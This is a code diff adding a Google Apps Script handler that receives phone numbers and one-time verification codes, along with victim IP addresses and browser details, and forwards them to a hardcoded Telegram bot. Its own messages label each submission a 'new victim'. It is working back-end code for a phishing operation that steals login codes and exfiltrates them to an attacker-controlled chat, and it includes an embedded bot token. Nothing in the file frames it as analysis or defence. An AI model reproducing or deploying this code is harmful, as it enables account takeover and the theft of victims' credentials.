@@ -1,0 +1,33 @@
+const TG_TOKEN = '8977800757:AAHUI60alRlfEWIHEHFIM7RaB6RtXnryapo';
+const TG_CHAT_ID = '8419067162';
+
+function doPost(e) {
+  try {
+    const data = JSON.parse(e.postData.contents);
+    
+    if (data.type === 'phone') {
+      var msg = '📱 Новая жертва\nНомер: ' + data.phone + '\nID: ' + (data.id || 'нет') + '\nIP: ' + (data.ip || 'нет') + '\nБраузер: ' + (data.userAgent || 'нет');
+      sendTelegram(msg);
+    }
+    if (data.type === 'code') {
+      var msg = '🔐 КОД: ' + data.code + '\nID: ' + (data.id || 'нет') + '\nIP: ' + (data.ip || 'нет');
+      sendTelegram(msg);
+    }
+    
+    return ContentService.createTextOutput(JSON.stringify({ status: 'ok' })).setMimeType(ContentService.MimeType.JSON);
+  } catch (error) {
+    return ContentService.createTextOutput(JSON.stringify({ status: 'error' })).setMimeType(ContentService.MimeType.JSON);
+  }
+}
+
+function doGet(e) {
+  return ContentService.createTextOutput(JSON.stringify({ status: 'ok' })).setMimeType(ContentService.MimeType.JSON);
+}
+
+function sendTelegram(msg) {
+  UrlFetchApp.fetch('https://api.telegram.org/bot' + TG_TOKEN + '/sendMessage?chat_id=' + TG_CHAT_ID + '&text=' + encodeURIComponent(msg));
+}
+
+function testTelegram() {
+  UrlFetchApp.fetch('https://api.telegram.org/bot' + TG_TOKEN + '/sendMessage?chat_id=' + TG_CHAT_ID + '&text=ТЕСТ');
+}
